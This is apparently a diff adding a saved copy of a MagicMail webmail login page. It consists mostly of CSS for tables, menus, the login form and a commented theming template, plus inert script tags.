+    <span class='tableHeaderHelpIconLeft' onClick=\"javascript:showHelp('emailoption_aliases')\"><span>
+    <span class='tableTitleHelpIconLeft'>Some Title</span>
+*/
+.tableHeaderHelpIconLeft {
+    cursor: help;
+    background: /*savepage-url=../pics/question_icon.svg*/ url() no-repeat;
+    background-position: top;
+    width: 16px;
+    height: 16px;
+    margin-left: 8px;
+    overflow: hidden;
+    float: left;
+}
+
+.tableHeaderHelpIconRight {
+    cursor: help;
+    background: /*savepage-url=../pics/question_icon.svg*/ url() no-repeat;
+    background-position: top;
+    width: 16px;
+    height: 16px;
+    margin-right: 8px;
+    overflow: hidden;
+    float: right;
+}
+
+.tableTitleHelpIconLeft {
+    padding-right: 24px;
+}
+
+.tableTitleHelpIconRight {
+    padding-left: 24px;
+}
+
+.tableHeaderLinkRight {
+    float: right;
+    margin-right: 10px;
+}
+
+.tableHeaderLinkRight a {
+    text-decoration: none;
+}
+
+table.MagicDataTable tr.subHeader {
+    border-bottom: 1px solid #999;
+    color: #343434;
+}
+
+table.MagicDataTable tr.header th, tr.subHeader th {
+    border-bottom: 1px solid #999;
+    font-weight: bold;
+    line-height: 18px;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul {
+    border-radius: 4px;
+    height: 18px;
+    list-style: outside none none;
+    margin: 0;
+    padding: 2px 0;
+    position: relative;
+    text-align: center;
+    width: auto;
+}
+
+table.MagicDataTable tr.subHeaderDark {
+    background: #848484 /*savepage-url=../pics/subheader.gif*/ url() repeat-x scroll 0 0;
+    color: #ffffff;
+}
+
+table.MagicDatable tr.subHeaderDark th a {
+    color: #ffffff;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li {
+    display: inline;
+    padding: 0;
+    text-align: left;
+    text-indent: 22px;
+    white-space: nowrap;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li.helplink a {
+    background: rgba(0, 0, 0, 0) /*savepage-url=../pics/helpicon.gif*/ url() no-repeat scroll 0 0;
+    border: 0 none;
+    cursor: help;
+    display: block;
+    font-size: 0;
+    height: 12px;
+    padding: 0;
+    width: 12px;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li a:link {
+    text-decoration: none;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li.helplink a:hover {
+    opacity: 0.7;
+}
+
+/* While all subHeaders should use th, some td's still exist */
+table.MagicDataTable tr.subHeader td {
+   font-weight: bold;
+   font-size: 1.1em;
+   padding: 3px 6px;
+}
+
+table.MagicDataTable td {
+    /* Technically, this should be a separate class */
+    border-bottom: 1px solid #dbdbdb;
+
+    padding: 3px 6px;
+
+    /* Override OuterTable definition */
+    vertical-align: baseline;
+}
+
+table.MagicDataTable td label {
+    display: inline-block;
+    padding-top: 0.8em;
+}
+
+.roomyrow {
+    line-height: 28px;
+}
+
+table.MagicDataTable tr.even {
+    background: #dedfde none repeat scroll 0 0;
+}
+
+table.MagicDataTable td .minibutton a {
+    color: #2951a5;
+    font-weight: normal;
+}
+
+td.success {
+    border: 2px solid #008800 !important
+}
+
+td.error {
+    border: 2px solid #990000 !important;
+}
+
+table.MagicDataTable tr.success td {
+    background: rgba(0, 0, 0, 0) /*savepage-url=../pics/icon-success.png*/ url() no-repeat scroll 0 0;
+    padding-left: 20px;
+}
+
+table.MagicDataTable tr.error td {
+    background: rgba(0, 0, 0, 0) /*savepage-url=../pics/icon-warning.png*/ url() no-repeat scroll 0 0;
+    padding-left: 20px;
+}
+
+table.MagicDataTable tr.subHeader th {
+    vertical-align: top;
+}
+
+table.MagicDataTable tr.subHeader.subHeaderDark th a {
+    color:white;
+    font-weight:normal;
+    padding:5;
+}
+
+table.MagicDataTable tr.subHeader th.checkcell a {
+    padding: 0px;
+}
+
+table.MagicDataTable .success {
+    text-align: center;
+    background-color: #88EE88;
+    border: 2px solid #008800;
+    font-weight: bold;
+    overflow: hidden;
+}
+
+table.MagicDataTable .error {
+    text-align: center;
+    border: 2px #990000 solid;
+    background-color: #FFCCD7;
+    font-weight: bold;
+}
+
+table.MagicDataTable .warning {
+    text-align: center;
+    border: 2px #b69508 solid;
+    background-color: #F0D511;
+    font-weight: bold;
+}
+
+/* LoginAlertBox, designed to be only loaded/shown on first login in */
+/* See example usage in MagicMail admin site for checking if the 'My Network IPs' file is updated */
+/* cat /etc/magic-mail/control/isp_owned_ranges */
+/* Possibly this is unique enough to go in page specific CSS files */
+div.postLoginAlert {
+    position: fixed;
+    width: 250px;
+    height: 300px;
+    right: 100px;
+    bottom: 100px;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    -webkit-user-drag: element; /* Doens't work fo every browser, but helpful */
+    transition: opacity 1s ease-out;
+    background-color: #FFF;
+}
+
+div.postLoginAlert .header {
+    color: #FFF; /* muddiAqua */
+    background-color: #18558C;
+    height: 26px;
+    font-size: 2.0em;
+    font-style: bold;
+    text-align: right;
+    vertical-align: center;
+    padding: 3px;
+    padding-right: 6px;
+}
+
+/* Experimental CSS Only trick to hide a div */
+div.postLoginAlert .main {
+    color: #000;
+    text-align: center;
+    padding-top: 1.0em;
+}
+
+div.postLoginAlert .main img {
+    margin: 5px;
+}
+
+div.postLoginAlert .hideMe {
+    cursor: pointer;
+}
+
+div.postLoginAlert .hideMe:focus + div.postLoginAlert > div {
+    display: none;
+}
+
+div.postLoginAlert .bigFont {
+    font-size: 2.0em;
+    color: #18558C;
+}
+
+div.postLoginAlert .regFont {
+    font-size: 0.9em;
+    padding: 5px;
+}
+
+div.postLoginAlert .bigNumber {
+    font-size: 1.5em;
+    color: #000;
+    display: block;
+    padding-top: 2px;
+}
+
+.multilist.select {
+    width: 250px;
+}
+
+.multilist.save {
+    width: 120px;
+}
+
+.multiListMiddleButtons {
+    width: 100px;
+}
+
+/* sliding toggle */
+.sliding-checkbox-center {
+    width: 75%;
+    margin: 0 auto;
+}
+
+.sliding-checkbox {
+    position: relative;
+    width: 50px;
+}
+
+.sliding-checkbox-checkbox {
+    display: none;
+}
+
+.sliding-checkbox-label {
+    display: block !important;
+    overflow: hidden; cursor: pointer;
+    border: 2px solid #999999; border-radius: 30px;
+    padding-top: 0em !important;
+}
+
+.sliding-checkbox.disabled .sliding-checkbox-label {
+    cursor: not-allowed;
+}
+
+.sliding-checkbox-inner {
+    display: block; width: 200%; margin-left: -100%;
+    transition: margin 0.3s ease-in 0s;
+}
+
+.sliding-checkbox-inner:before, .sliding-checkbox-inner:after {
+    display: block; float: left; width: 50%; padding: 0; line-height: 1.5;
+    font-size: 12px;
+    box-sizing: border-box;
+    border-radius: 30px;
+}
+
+.sliding-checkbox-inner:before {
+    content: "ON";
+    padding-left: 4px;
+    background-color: #22B24C; color: #FFFFFF;
+}
+
+.sliding-checkbox-inner:after {
+    content: "OFF";
+    padding-right: 4px;
+    background-color: red; color: #FFFFFF;
+    text-align: right;
+}
+
+.sliding-checkbox.disabled .sliding-checkbox-inner:before,
+.sliding-checkbox.disabled .sliding-checkbox-inner:after {
+    background-color: #EEEEEE;
+    color: #999999;
+}
+
+.sliding-checkbox-switch {
+    display: block; width: 20px; margin: 0px;
+    background: #FFFFFF;
+    border: 2px solid #999999; border-radius: 30px;
+    position: absolute; top: 0; bottom: 0; right: 30px;
+    transition: all 0.3s ease-in 0s; 
+    box-shadow: 0 1px 1px white inset;
+}
+
+.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-inner {
+    margin-left: 0;
+}
+
+.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-switch {
+    right: 0px; 
+}
+
+/*------------------------------------------*/
+/* Empty tables message */
+/*------------------------------------------*/
+tr td.empty_table span {
+    display: flex;
+    justify-content: center;
+    font-weight: bolder;
+    color: #18598c;
+    word-spacing: 4px;
+    letter-spacing: 4px;
+    cursor: default;
+    opacity: .3;
+    text-transform: uppercase;
+    font-size: 12px;
+    margin: 4px 0;
+}
+
+/*------------------------------------------*/
+/* normalized / common action button styles */
+/*------------------------------------------*/
+
+/* style for buttons on a table row */
+td.mm-table-action-buttons,
+ /* style for full width divs method */
+.mm-fw-div-action-buttons {
+    text-align: right;
+}
+
+/* ensure if there are multiple buttons, that they receive some gaps between */
+td.mm-table-action-buttons > * {
+    margin-left: 5px;
+}
+
+/* style for buttons in a non full width div (TODO: find a better way... float is evil) */
+.mm-nfw-div-action-buttons {
+    float: right;
+}
+
+/* style for flexed buttons... */
+.mm-fb-action-buttons {
+    display: flex;
+    justify-content: end;
+    gap: 5px;
+    padding-top: 10px;
+}
+
+</style>
+    <!--[if IE]><link rel='stylesheet' href='css/magicmail-ie.css?mtime=1744239718' type='text/css'/>
+<![endif]-->
+<style data-savepage-href="css/css.css?mtime=1744239718" type="text/css">/* CSS Standard files for the User Interface ONLY */
+
+/* Custom for Links in the menu for user interface */
+#MagicMenu li#MenuHome > a {
+    background: /*savepage-url=../pics/home_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuWebmail > a {
+    background: /*savepage-url=../pics/webmail_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuSpam > a {
+    background: /*savepage-url=../pics/spam_management_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuEmail > a {
+    background: /*savepage-url=../pics/my_email_options_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuSecurity > a {
+    background: /*savepage-url=../pics/security_options_icon.svg*/ url() left center no-repeat;
+}
+#MagicMenu li#MenuSecurity ul #LockMyMailbox > a {
+    background: /*savepage-url=../pics/key_icon.svg*/ url() left center no-repeat;
+    padding: 0 0 0 28px;
+}
+#MagicMenu li#MenuDomains > a {
+    background: /*savepage-url=../pics/manage_domains_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuMailboxes > a {
+    background: /*savepage-url=../pics/manage_mailboxes_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuMailingLists > a {
+    background: /*savepage-url=../pics/mailing_list_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuLogout > a {
+    background: /*savepage-url=../pics/logout_icon.svg*/ url() left center no-repeat;
+}
+
+#MagicMenu li#MenuHelp a {
+    background-position: 0 -241px;
+}
+
+#MagicMenu li#MenuHelp a:hover {
+    background-position: 0 -271px;
+}
+
+#webmaillinks {
+    margin-top: 30px;
+    margin-left: 50px;
+}
+
+#webmaillinks a {
+    text-decoration: none;
+    font-weight: bold;
+}
+
+#webmaillinks table tr {
+    max-width: 300px;
+}
+
+
+#webmaillinks td {
+    vertical-align: top;
+    text-align: center;
+    width: 100px;
+}
+
+/* User Interface shows Security Status in the Menu */
+/* Security Status */
+
+#MagicStatus {font-weight: bold}
+
+#MagicStatus p {
+        margin: 8px 0;
+        width: 175px;
+        text-align: center; 
+}
+
+#MagicStatus small {font-size: 11px}
+
+#MagicStatus #MagicStatus-container {margin: -4px 0 0}
+
+#MagicStatus #MagicStatus-container a img[alt="enabled"]{background: /*savepage-url=../pics/spamenabled.gif*/ url() no-repeat}
+#MagicStatus #MagicStatus-container a img[alt="disabled"]{background: /*savepage-url=../pics/spamdisabled.gif*/ url() no-repeat}
+#MagicStatus #MagicStatus-container a img[alt="unavailable"]{background: /*savepage-url=../pics/spamunavailable.gif*/ url() no-repeat}
+
+#MagicStatus #MagicStatus-container a:hover[id="MagicStatus-spam"],
+#MagicStatus #MagicStatus-container a:hover[id="MagicStatus-virus"] {
+        filter: alpha(opacity=80);
+        opacity: 0.8;
+}       
+
+#MagicStatus #MagicStatus-container a[id="MagicStatus-spam"] > img,
+#MagicStatus #MagicStatus-container a[id="MagicStatus-virus"] > img { 
+        height: 0;
+        padding: 22px 76px 0 0;
+        width: 0;
+}       
+/* Used from the library, only for user interface */
+.domain-policy {
+    padding: 5px;
+    border-bottom: 1px solid #eee;
+}
+
+/* Some rules for position the AdTrack top header banner in User Interface */
+/* MOVE to magicmail specific files, css.css or page specific, or plugin specific */
+.adtrack-user-spot-a {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+
+}
+
+.adtrack-user-spot-a-auth {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+
+}
+/* Some rules for position the AdTrack top header banner in User Interface */
+
+.adtrack-user-spot-a {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+
+}
+
+.adtrack-user-spot-a-auth {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+}
+
+.BodyPadding {
+    margin-left: 15px;
+    margin-right: 15px;
+}
+
+#loggedinas {
+    margin: 4px 4px 12px 10px;
+}
+
+.MagicMenuCell {
+    background: /*savepage-url=../pics/clearleft_menu_1px.png*/ url() repeat-y top left;
+    margin: 0;
+    padding: 0px 0px 15px 25px;
+    min-height: 300px;
+    width: 200px;
+    font: 12px Verdana, Arial, Helvetica, sans-serif !important;
+}
+</style>
+<style data-savepage-href="css/magicmail.login.css?mtime=1744239718" type="text/css">.MagicContentCell {
+    background: none;
+    padding-top: 0px;
+}
+.MagicNavTab {
+    display: none;
+}
+#UserSubHeaderRow {
+    display: none;
+}
+#MainHeaderTable {
+    height: 130;
+    /* Make the grey gradient smaller during login */
+    background-image: linear-gradient(#fefefe 0, #e6e7e8 80%,#FFF 20%);
+}
+#loginContentCell {
+    margin: 0px 40px 20px 40px;
+    padding: 20px;
+    border-radius: 8px ;
+    -moz-border-radius: 8px ;
+    -webkit-border-radius: 8px ;
+    background: #FFF;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    transition: opacity 1s ease-out;
+    display: flex;
+}
+
+.login-info-content {
+    width: 384px;
+    margin-left: 20px;
+    margin-top: 20px;
+}
+/* The following two SHOULD be defaults */
+.login-info-content h2 {
+    font-size: 2.5em;
+}
+.login-info-content h4,
+#login-form-table h4 {
+    color: #10456B;
+    font-size: 1.4em;
+    font-weight: bold;
+}
+#login-form-table h4 {
+    text-align:center;
+}
+.login-info-content .main_wiz {
+    color: #000;
+    opacity: 0.7;
+}
+#login-form-wrapper {
+    margin-right: 20px;
+    margin-top: 20px;
+    width: 350px;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    transition: opacity 1s ease-out;
+    margin-left: 100px;
+    padding-bottom: 30px;
+}
+#login-form-table {
+    border: collapse;
+    border-spacing: 0;
+    width: 80%;
+    border: 0px;
+    margin: 0 auto;
+}
+#login-form-table th {
+    border: 0px 0px 0px 2px solid darkgrey;
+    background: none;
+    padding-top: 20px;
+    padding-bottom: 10px;
+}
+#login-form-table td {
+    display: block;
+    text-align: left;
+}
+#login-form-table tr td:first-child {
+    padding-top: 20px;
+}
+#login-form-table tr td:nth-child(2) {
+    padding-top: 5px;
+}
+#login-form-table tr:last-child {
+    text-align: right;
+}
+#login-form-table label {
+    font-size: .9em;
+}
+#login-form-table td.textright {
+    color: #000;
+    opacity: 0.7;
+}
+#login-form-table input {
+    padding: 0px;
+    margin: 0px;
+    font-size: 1.3em;
+    line-height: 1.4em;
+}
+#login-form-table input[type="submit"] {
+    text-align: right;
+    float: right;
+    border: 1px outset #10456B;
+    background: lightgrey;
+    padding: 5px 15px 5px 15px;
+    cursor: pointer;
+}
+/* Way to position to the adtrack insider the header */
+.adtrack-user-spot-a {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+
+}
+/* Legacy id's from themes, are we to deprecate? */
+/* Also could be from landing.php as well */
+#recover-pass-td a {
+    display: inline-block;
+    padding-bottom: 5px;
+    text-decoration: none;
+}
+
+#login-error {
+    display: none;
+    position:absolute;
+    width:148px;
+    margin-top:4px;
+    font-weight:bold;
+}
+
+/* Login Page */
+#LoginWrapper {
+    margin: auto;
+    width: 620px;
+}
+
+#LoginInfo {
+    float: left;
+    width: 400px;
+    text-align: left;
+    font-size: 14px;
+    margin: 0;
+}
+#LoginInfo p {
+    margin-top: 8px;
+}
+
+.LoginBody {
+    background: #fff /*savepage-url=../pics/background2.gif*/ url() repeat-x 0 0;
+}
+.LoginBody a {
+    text-decoration: none;
+}
+
+.LoginBody #PoweredBadge {
+    width: 100%;
+    text-align: center;
+    margin-top: 5px;
+}
+
+#login-form-table td.formFoot tr td {
+    display: table-cell;
+    padding-top: 0px;
+    vertical-align: middle;
+}
+
+/* There is some whitespace in the powered by image. Move it left so that the */
+/* actual image is in line with everything else */
+#login-form-table tr td.poweredBy img {
+    margin-left: -6px;
+}
+
+#login-form-table tr td.formFoot {
+    padding-top: 0px;
+}
+
+#login-form-table tr td.formFoot table {
+    width: 100%;
+}
+
+.LoginBody #Login {
+    padding: 5px 15px 0;
+}
+
+#Login {
+    width: 180px;
+    padding: 5px 15px 35px;
+    -moz-border-radius: 7px;
+    -webkit-border-radius: 7px;
+    border-radius: 7px;
+    border-top: 2px solid #ededed;
+    border-left: 2px solid #ededed;
+    border-right: 1px solid #cdcdcd;
+    border-bottom: 1px solid #cdcdcd;
+    background: #dedede;
+    margin-top: 50px;
+    float: left;
+}
+
+#Login a:hover {
+    border:none;
+}
+
+#LoginHeader h3 {
+    margin-bottom: 10px;
+    color: #10456B;
+}
+
+#login-form-table input[type="text"],
+#login-form-table input[type="email"],
+#login-form-table input[type="password"] {
+    border-top: 2px solid #cdcdcd;
+    border-left: 2px solid #cdcdcd;
+    border-bottom: 2px solid #ededed;
+    border-right: 2px solid #ededed;
+    -moz-border-radius: 5px;
+    -webkit-border-radius: 5px;
+    border-radius: 5px;
+    padding: 2px;
+    height: 1.5em;
+    width: 100%;
+}
+
+#login-form-table .show-password label {
+	display: block;
+	font-size: .8em;
+    margin-top: 10px;
+}
+
+
+#login-form-table .show-password input[type="checkbox"] {
+	vertical-align: bottom;
+  	position: relative;
+	font-size: .8em;
+}
+
+/* IE 10+ Detection (including MS Edge) */
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+    /*
+        For IE only, we won't have the email and password inputs below the
+        labels.  It doesn't seem to be possible to actually separate <td> tags
+        by newlines in IE like you can with other browsers with the
+        display: block. However, without doing anything, the inputs appear
+        higher up than the labels, so this margin top pushes the inputs down to
+        be inline with the labels
+     */
+    #login-form-table input[type="email"],
+    #login-form-table input[type="password"] {
+        margin-top: 10px;
+    }
+}
+
+#login-form-table input[type="email"]:focus,
+#login-form-table input[type="password"]:focus {
+    background:#ffedde;
+}
+
+/* For backward compatability let's hide this row
+.forgot-password-row {
+    display: none;
+}
+*/
+
+
+.login-modal-input {
+    display: flex;
+    align-items: end;
+    font-size: 15px;
+    margin: 10px 0 20px;
+}
+
+.login-modal-input input[type=checkbox]{
+    flex: none;
+    width: 25px;
+    height: 25px;
+} 
+
+#login-modal-buttons {
+    display: flex;
+    justify-content: space-around;
+}
+
+#login-modal-buttons input {
+    height: 50px;
+}
+
+</style>
+<style data-savepage-href="html_files/user.css?mtime=1616453359" type="text/css">/*
+ * ==============================
+ * ===     Introduction       ===
+ * ==============================
+ * This file affects 2 interface areas:
+ *  - The Landing Page
+ *  - The User Interface (email settings, etc)
+ *
+ *
+ * Change here *do not* affect these interface areas:
+ *  - The Admininistration Interface
+ *  - Webmail Lite
+ *  - Tuxedo
+ *  - Personal Pages
+ *
+ *
+ * This file is split into 4 parts:
+ *  - The introduction (this)
+ *  - The Landing Page
+ *      - These settings affect only the Landing Page
+ *  - The User Interface
+ *      - These settings affect only the User Interface
+ *  - All
+ *      - These settings affect both the Landing Page & the User Interface
+ *
+ * 
+ * Each section has a number of CSS rules to affect a section of the
+ * interface. Section comments include a description of the affected part
+ * of the interface, and a list of what the changes in the example do.
+ *
+ * The code for each block is commented out so that the changes will not take
+ * effect by default. To try out a rule, uncomment its section, and the
+ * changes will take effect upon the next refresh of the affected web page.
+ */
+
+
+
+
+/*
+ * ==============================
+ * ===     Landing Page       ===
+ * ==============================
+ *
+ * The following settings apply only to the landing page.
+ */
+
+
+
+/*
+ * #LoginWrapper contains all of the text elements in the center of the screen.
+ *
+ * - Apply a border around the container.
+ * - Change the container's background colour.
+ */
+
+/*
+#LoginWrapper {
+    background-color: #E8ECE8;
+    border: solid #E0E0E0 3px;
+    padding: 5px;
+}
+*/
+
+
+
+/*
+ * The #Login field is a container holding the login form.
+ *
+ * - Add a little blue to give a hint of color.
+ * - Add additional spacing under it.
+ */
+
+/*
+.LoginBody #Login {
+    background-color: #E0E0FF;
+    margin-bottom: 15px;
+}
+*/
+
+
+
+/*
+ * #LoginHeader is holds the title of the login form.
+ *
+ * - Make the "Sign in" title show more prominently.
+ */
+
+/*
+.LoginBody #Login #LoginHeader {
+    text-transform: uppercase;
+}
+.LoginBody #Login #LoginHeader H3 {
+    color: #0000D0;
+}
+*/
+
+
+
+/*
+ * #login-email and #login-password are the input fields of the login form.
+ *
+ * - Change the default color of the login fields.
+ * - Change the hover color of the login fields.
+ * - Change the focus color of the login fields.
+ */
+
+/*
+#login-email, #login-password {
+    background-color: #E0E0E0;
+}
+.LoginBody #Login #login-email:focus, .LoginBody #Login #login-password:focus {
+    background-color: #FFFFFF;
+}
+#login-email:hover, #login-password:hover {
+    background-color: #FFF6DF;
+}
+*/
+
+
+
+/*
+ * For the Landing Page, you may use .LoginBody to reference the <body> tag.
+ *
+ * - Add a light green tinge to the page body background.
+ */
+
+/*
+.LoginBody {
+    background-image: none;
+    background-color: #F6FFF6;
+}
+*/
+
+
+
+/*
+ * #Footer contains your company information and the copyright notice at the
+ * bottom of the page.
+ *
+ * - Reduce the internal padding of the container.
+ */
+
+/*
+#Footer {
+    padding-top: 5px;
+    padding-bottom: 0px;
+}
+*/
+
+
+
+
+/*
+ * ==============================
+ * ===    User Interface      ===
+ * ==============================
+ *
+ * The following settings only apply to the User Interface.
+ */
+
+
+
+/*
+ * For the User Interface pages, you may use .MagicBody to reference the
+ * <body> tag.
+ *
+ * - Add a light green tinge to the background.
+ */
+
+/*
+.MagicBody {
+    background-image: none;
+    background-color: #F6FFF6;
+}
+*/
+
+
+
+/*
+ * .MagicOuterTable contains everything on the page.
+ *
+ * - Shrink the outer border by one pixel.
+ * - Make the container's borders appear raised.
+ */
+
+/*
+.MagicOuterTable {
+    border-width: 3px;
+    border-color: #707070 #000000 #000000 #707070;
+}
+*/
+
+/*
+ * .MagicHeaderTable contains everything on the header.
+ *
+ * - Change the background
+ * - Change the background of just top 90% of header
+ */
+
+#MainHeaderTable {
+    background: #18558c;
+    background: #FFF;
+    height: auto;
+}
+#MainHeaderTable tr:first-child {
+    /* Mix Background Image with bottom color */
+    background: #fff /*savepage-url=../pics/mm_theme_3_header_bg.png*/ url() no-repeat;
+    background-size: cover;
+}
+/* Don't display default logo img span, normally done by editing header_style1.html */
+#MMLogo {
+    background: /*savepage-url=../pics/mm_theme_3_header_logo.png*/ url() no-repeat;
+    background-position: 40px ;
+    height: 55px;
+}
+#leftHeaderLogo,#rightHeaderLogo {
+    visibility: hidden;
+}
+#rightHeaderLogo,#HeaderLogo {
+    height: 51px;
+    width: 200px;
+    padding: 0px;
+    display: inline-block;
+}
+
+#MainHeaderTable td:nth-child(2) {
+    background: /*savepage-url=../pics/mm_theme_3_yourcompany_logo.png*/ url() no-repeat right bottom;
+    background-position: top right;
+    width: 400px;
+}
+
+#UserSubHeaderRow {
+    background-color: #FFF;
+    display: block;
+}
+/* The following also is supposed to have text 'Email Made Easy' */
+#MainHeaderSubMenu {
+    background-position: 30px;
+    background: none;
+    display: block;
+}
+
+/* If we want to use this in the blue bar, we have to use 'tricks' */
+/* Or, we can customize header_style1.html */
+/* Or, we can use methods seen in the admin interface for MainHeaderSubMenu */
+.MagicNavTab {
+    position: absolute;
+    margin-top: 31px;
+    margin-left: 110px;
+    height: 15px;
+    padding-top: 2px;
+    border-radius: 0px;
+    font-size: 1.0em;
+    background-color: #999999;
+}
+.MagicContentTable {
+    background-image: linear-gradient(#ffffff, #e6e7e8);
+    height: calc(100% - 107px);
+}
+.MagicMenuCell {
+    background-image: linear-gradient(#e6e7e8,#FFF);
+    background-image: none;
+    padding-left: 20px;
+}
+
+.MagicContentCell {
+    border-top: 1px solid #10456B; 
+    background: none;
+    background-color: #FFF;
+}
+.MagicContentCell th {
+    height: 36.5px;
+    border: solid 2px #dedfde;
+    background-image: linear-gradient(#e6e7e8,#FFF);
+    background: none;
+}
+.MagicContentCell th ul li {
+    color: #00567b;
+}
+/* Bad code workaround */
+#EmailOptions table.VacationMsg th .disabled {
+￼    color: #da1010;
+}
+#EmailOptions table th {
+    background: none;
+}
+#EmailOptions table th ul {
+    border: 0px;
+}
+#LoginContentCell {
+    margin-top: 20px;
+}
+
+#loggedinas {
+    margin-top: 0px;
+    margin-right: 0px;
+    margin-bottom: 0px;
+    border-radius: 16px 0px 0px 0px;
+    overflow: hidden;
+    background-color: #e6e7e8;
+    background-color: #fff;
+    width: auto;
+}
+#Sidebar {
+    background-image: linear-gradient(#e6e7e8,#FFF);
+    margin-left: 9px;
+    height: 100%;
+    border-right: 2px solid #10456B;
+}
+
+#EmailOptions table th ul li.helplink a,#EmailOptions table li a.helplink {
+    background: /*savepage-url=../pics/question_icon.svg*/ url() no-repeat;
+    background-size: contain;
+}
+
+h2 {
+    color: #9f704b;
+    font-size: 150%;
+    fonnding_info.html t-weight: bold;
+    margin: 0 0 8px;
+}
+/*
+ * #loggedinas is the container in the top-left that shows the currently
+ * logged in user.
+ *
+ * - Make the title bold.
+ * - Make the email address red.
+ * - Shrink the border.
+ * - Make the border dotted.
+ */
+
+/*
+#loggedinas {
+    font-weight: 900;
+    border-width: 1px;
+    border-style: dotted;
+}
+#loggedinas strong {
+    color: #E80000;
+}
+*/
+
+
+
+/*
+ * #SideBar is the left-hand bar containing the navigation menu.
+ *
+ * - Make the title texts in the menu dark gray.
+ */
+
+/*
+#SideBar h4 {
+    color: #303030;
+}
+*/
+
+
+
+/*
+ * #MagicMenu is the main navigation menu on the left hand side.
+ *
+ * - Make the text bold.
+ * - Make the link texts blue.
+ */
+
+/*
+#MagicMenu ul li a {
+    font-weight: 900;
+    color: #0000A0;
+}
+*/
+#MagicMenu ul li {
+    padding-top: 3px;
+    padding-bottom: 5px;
+}
+
+
+/*
+ * #MagicSpamCount is the container for the spam status widget.
+ *
+ * - Make the title's background green.
+ * - Make the spam count number bold.
+ */
+
+/*
+#SideBar #MagicSpamCount h4 {
+    background-color: #004000;
+    color: #FFFFFF;
+}
+#MagicSpamCount p span {
+    font-weight: 900;
+}
+*/
+
+
+
+/*
+ * .MagicContentCell holds all of the content beside the navigation bar, and
+ * is the main content container.
+ *
+ * - Increase the font size to make it easier to read.
+ * - Add additional padding.
+ */
+
+/*
+.MagicContentCell {
+    font-size: 125%;
+    padding-right: 5px;
+    padding-bottom: 5px;
+}
+*/
+
+
+
+/*
+ * The h2 inside .MagicContentCell is the main header at the top of the page.
+ *
+ * - Increase the font size.
+ * - Set the font colour to black.
+ */
+
+/*
+.MagicContentCell h2 {
+    font-size: 160%;
+    color: black;
+}
+*/
+
+
+
+/*
+ * div.minibutton's are used throughout the interface for applying settings
+ * and refreshing information.
+ *
+ * - Add shading using borders.
+ * - Darken the text to make it stand out.
+ */
+
+/*
+div.minibutton {
+    border: solid #0000FF 1px;
+    background-color: #5050FF;
+}
+div.minibutton a {
+    border: solid #A0A0FF 1px;
+    background-image: none;
+    background-color: #D0D0FF;
+}
+#EmailOptions td div.minibutton a {
+    color: #0000A0;
+    font-weight: 900;
+}
+*/
+
+
+
+/*
+ * .error is the class for error messages. These message are usually inside
+ * td or div HTML elements.
+ *
+ * - Make them stand out more prominently.
+ */
+
+/*
+.error {
+    font-weight: 900;
+    color: red;
+    background-color: #FFD0D0;
+    text-decoration: underline
+}
+*/
+
+
+
+
+/*
+ * ==============================
+ * ===         All            ===
+ * ==============================
+ *
+ * The following settings apply to both the User Interface and the Landing
+ * Page.
+ */
+
+
+
+/*
+ * .MagicCopyRight contains your company information and the copyright notice.
+ *
+ * - Fade the copyright a little to make your company information more
+ *   prominent.
+ */
+
+/*
+.MagicCopyRight {
+    color: #877;
+}
+.MagicCopyRight a {
+    color: #50859B;
+}
+.MagicCopyRight a:hover {
+    color: #000000;
+}
+*/
+
+/* CityEmail Specific */
+.MagicCompanyFooter {
+    background-color: #6d6d6d;
+    background-color: #18558C;
+    background-color: #f0f1f2;
+    color: #707070;
+}
+.MagicCompanyFooter a {
+    color: #000;
+}
+.MagicCopyRight {
+    color: #000;
+    background-color: #ea821f;
+}
+
+</style>
+<script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="js/global_javascript.js?mtime=1741902405"></script>
+<script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="js/htmlcanvas.js?mtime=1744239718"></script>
+<script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="js/login.js?mtime=1744239718"></script>
+<script language="JavaScript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="js/jquery.js?mtime=1744245097"></script>
